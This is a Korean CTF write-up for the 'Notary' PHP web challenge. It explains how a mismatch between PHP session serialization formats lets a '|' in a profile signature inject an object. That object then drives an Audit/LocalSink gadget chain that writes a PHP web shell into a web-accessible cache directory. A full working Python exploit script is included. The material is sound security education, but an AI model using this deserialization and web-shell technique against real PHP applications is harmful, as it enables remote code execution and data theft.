---
title: "notary Write-Up"
date: 2026-09-30
categories: ["CTF", "Write-Up"]
tags: ["CTF", "Web", "PHP", "Session", "Deserialization"]
summary: "2026 HSPACE의 SpaceWar Web에서 출제 notary 분석 및 Write Up"
---

## Intro

안녕하세요!

오늘은 HSPACE에서 주최하는 Space War의 Web 대회에서 **Notary** 문제를 분석 및 풀이를 해보려 합니다. 문서를 만들고 프로필에 서명을 적을 수 있는 작은 PHP 서비스인데, 정작 눈여겨볼 부분은 문서 내용보다 **서명이 세션에 저장되는 방식**이었습니다.

이번에는 제공되는 로컬 코드가 따로 없어서, HTTP 응답을 보며 거꾸로 동작을 추적했습니다. <br>처음부터 가젯이 보이는 문제가 아니라, 한 단계씩 확인해야 해서 꽤 고생하면서 풀었던 기억이 있습니다.

그러면 문제를 바로 확인해보겠습니다!
<br> <br>

---

## 00_문제 설명

```json
{
  "Title": "Notary",
  "Description": "Store documents and read them back. Your profile carries a signature line."
}
```

회원가입 후 문서를 만들고, 프로필의 `sig`에 서명을 저장할 수 있습니다. 문서를 조회하면 브라우저가 `hit.php?id=<문서 ID>`를 1×1 GIF로 함께 요청합니다.

서명이 화면에 출력되니 처음에는 XSS를 의심했습니다. 그런데 출력은 HTML 이스케이프되어 있었고, 일반적인 태그를 넣어도 실행되지 않았습니다. 대신 눈에 띈 건 **유효한 문서 ID로 `hit.php`를 호출한 직후 세션이 풀리고 서명이 비워지는 현상**이었습니다.
<br> <br>

---

## 01_서비스 동작 분석

### 01-1_문서 조회가 세션을 건드린다

확인한 주요 경로는 아래와 같습니다.

```text
POST /register.php            계정 생성
POST /new.php                 문서 생성
POST /profile.php             서명(sig) 저장
GET  /doc.php?id=<12 hex>     문서 조회
GET  /hit.php?id=<12 hex>     1×1 GIF 응답
```

문서 페이지가 `hit.php`를 자동으로 부르는 걸 보고, 새 계정으로 문서를 하나 만든 뒤 이 경로를 따로 호출해봤습니다. 응답은 정상적인 GIF였지만, 이후 프로필에 다시 가면 로그인 상태가 깨져 있었습니다. 단순 조회처럼 보이는 요청이 같은 세션 파일을 읽거나 다시 쓰고 있다는 단서로 생각했습니다.

여기서 서명의 `|` 문자가 그대로 저장된다는 점도 파악했습니다! <br>참고로 PHP의 기본 세션 저장 형식에서는 이 문자가 **변수 이름과 직렬화된 값을 나누는 구분자**입니다.

<br>

### 01-2_서로 다른 세션 저장 형식

PHP 세션에는 `php_serialize`와 기본 `php`처럼 서로 다른 직렬화 형식이 있습니다. 모양을 단순화하면 아래와 같습니다!

```text
php_serialize : a:2:{s:1:"u";...s:3:"sig";s:N:"서명 값";}
php           : u|직렬화된 값sig|직렬화된 값
```

<br>
실험 결과, 일반 페이지는 세션을 `php_serialize` 형식으로 저장하는 반면 `hit.php`는 같은 파일을 기본 `php` 형식으로 읽는 것으로 판단했습니다. 원본 소스가 없으므로 설정 줄을 직접 본 것은 아니지만, 서명에 넣은 구분자와 객체가 실제로 해석되는 동작까지 확인했습니다.

예를 들어 서명을 아래처럼 저장합니다.

```text
x|O:5:"Audit":0:{}
```
<br>

일반 페이지에서는 이것이 그저 `sig`의 문자열로 사용되지만, `hit.php`가 세션 파일을 `php` 형식으로 읽으면, 문자열 안의 첫 `|`를 구분자로 보고 그 뒤의 `O:5:"Audit":0:{}`를 PHP 객체로 역직렬화할 수 있습니다. 그 앞의 바이트열은 세션 변수 이름 쪽으로 해석됩니다.

확인용으로 `SplFileObject` 객체를 넣었을 때 `hit.php`가 500을 반환했습니다. 평범한 서명에서는 나오지 않던 응답이라, 서명 내부의 객체 직렬화 데이터가 실제 처리 경로에 들어간다는 것을 확인할 수 있었습니다!
<br> <br>

---

## 02_Exploit Ideation

객체를 넣을 수 있어도, 서버에 쓸 만한 클래스가 없으면 사실.. 필요가 없습니다! <br>이 부분에서 좀 고생을 했었습니다.

직접 PHP 파일을 쓰게 할 것 같은 속성 이름을 여러 개 넣어봤지만 별 반응이 없었습니다. 이후 세션을 다시 직렬화할 때 생기는 차이를 이용해 원격 클래스의 속성을 확인했고, `Audit`에 `sink`, `lines`가 있다는 것을 알아냈습니다. 같은 방식으로 `LocalSink`의 `dir`, `name`도 확인했습니다. 

최종적으로 사용한 객체 관계는 시각적으로 정리하면 아래와 같습니다!

```text
Audit
├─ sink  → LocalSink
│           ├─ dir  = /var/www/html/cache
│           └─ name = <무작위 이름>.php
└─ lines → ["<?php ... ?>"]
```
<br>

`Audit` 객체가 요청 종료 시 `lines`를 `sink`에 기록하게 만들고, `LocalSink`의 저장 위치를 웹에서 접근 가능한 `cache` 디렉터리로 지정했습니다. 파일 이름을 `.php`로 끝내면, 기록된 내용을 HTTP로 요청해 실행할 수 있습니다.

실제 페이로드의 앞부분은 이런 형태입니다.

```text
x|O:5:"Audit":2:{s:4:"sink";O:9:"LocalSink":2:{...}s:5:"lines";a:1:{...}}
```
<br>

`O:5`와 `O:9`는 각각 클래스 이름의 바이트 길이입니다. PHP 직렬화 문자열도 글자 수가 아니라 **바이트 길이**를 적어야 하므로, 익스플로잇 코드에서 `len(value.encode())`로 계산했습니다.
<br> <br>

---

## 03_Exploit

공격 순서는 아래의 차례로 진행했습니다!

```text
1. 계정을 만들고 문서를 생성해 유효한 12자리 문서 ID를 얻는다.
2. 프로필 서명에 x| + Audit → LocalSink 직렬화 객체를 저장한다.
3. 같은 세션으로 hit.php?id=<문서 ID>를 호출한다.
4. /cache/<무작위 이름>.php를 요청해 실행 결과를 읽는다.
```
<br>

문서 ID를 먼저 만드는 이유는 `hit.php`가 유효한 문서에 대해 정상 처리 경로를 타도록 하기 위해서입니다. `hit.php`를 호출한 뒤 세션이 망가져도, 이미 파일이 작성되었다면 새 HTTP 클라이언트로 캐시 파일에 접근할 수 있습니다.

아래는 최종 익스플로잇 코드입니다. 실행 대상 주소는 인자로 바꿀 수 있습니다.

<details>
<summary>Exploit Code</summary>

```python
#!/usr/bin/env python3
import http.cookiejar
import re
import secrets
import sys
import urllib.error
import urllib.parse
import urllib.request

DEFAULT_BASE = "http://43.200.202.150:8001"


def php_string(value: str) -> str:
    return f's:{len(value.encode())}:"{value}";'


def pop_payload(filename: str, php_code: str) -> str:
    sink = (
        'O:9:"LocalSink":2:{'
        's:3:"dir";'
        + php_string("/var/www/html/cache")
        + 's:4:"name";'
        + php_string(filename)
        + "}"
    )
    audit = (
        'O:5:"Audit":2:{'
        's:4:"sink";'
        + sink
        + 's:5:"lines";a:1:{i:0;'
        + php_string(php_code)
        + "}}"
    )

    return "x|" + audit


def client():
    jar = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))


def request(web, base: str, path: str, fields=None):
    data = None
    if fields is not None:
        data = urllib.parse.urlencode(fields).encode()
    req = urllib.request.Request(base.rstrip("/") + path, data=data)
    try:
        return web.open(req, timeout=15)
    except urllib.error.HTTPError as error:
        return error


def main():
    base = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_BASE
    web = client()
    username = "exp" + secrets.token_hex(5)
    password = "P" + secrets.token_hex(8)

    registered = request(
        web,
        base,
        "/register.php",
        {"u": username, "p": password},
    )
    registered.read()
    if registered.getcode() != 200:
        raise RuntimeError("registration failed")

    created = request(
        web,
        base,
        "/new.php",
        {"title": "exploit trigger", "body": "trigger"},
    )
    created.read()
    match = re.search(r"id=([0-9a-f]{12})", created.geturl())
    if not match:
        raise RuntimeError("could not obtain document id")
    doc_id = match.group(1)

    token = secrets.token_hex(8)
    filename = token + ".php"
    php_code = (
        "<?php foreach(glob('/flag*')?:[] as $f){"
        "echo $f,':',file_get_contents($f),PHP_EOL;} ?>"
    )
    signature = pop_payload(filename, php_code)

    saved = request(web, base, "/profile.php", {"sig": signature})
    saved_body = saved.read()
    if saved.getcode() != 200 or b"saved" not in saved_body.lower():
        raise RuntimeError("profile payload was not saved")

    triggered = request(web, base, "/hit.php?id=" + doc_id)
    triggered.read()
    if triggered.getcode() != 200:
        raise RuntimeError(f"trigger failed with HTTP {triggered.getcode()}")

    result = request(client(), base, "/cache/" + filename)
    output = result.read().decode("utf-8", "replace")
    if result.getcode() != 200:
        raise RuntimeError(f"web shell fetch failed with HTTP {result.getcode()}")

    print(output, end="" if output.endswith("\n") else "\n")
    flags = re.findall(r"[A-Za-z][A-Za-z0-9_]*\{[^\r\n}]+\}", output)
    if not flags:
        raise RuntimeError("no flag-shaped value in remote output")
    print("FLAG=" + flags[-1])


if __name__ == "__main__":
    main()
```

</details>
<br>

PHP 파일에는 `/flag*`에 해당하는 파일을 읽어 출력하는 코드를 넣었습니다. 실제 원격 서버에서는 다음 응답을 얻을 수 있었습니다!

```text
/flag_31b8c6a0d5e7.txt:hspace{bd6ea44a078e208db33c4d90d3fded4f04aaec87e2238168a06041fee02ab471}
```
<br> <br>

---

## 04_Outro

처음에는 서명이 어디에 출력되는지만 보고 XSS 쪽을 계속 살폈습니다. <br>하지만 실제로 중요한 건 출력 화면이 아니라, 그 서명을 저장한 **세션 파일을 다른 형식으로 다시 읽는 경로**였다는 깨달음을 준 문제였슴다.

`|` 하나로 객체 역직렬화까지 이어지는 것도 흥미로웠지만, 소스 없이 `Audit`와 `LocalSink`의 구조를 찾아내는 과정이 더 기억에 남습니다!

그러면 오늘 글은 여기서 마치겠습니다!

읽어주셔서 감사합니다🤭
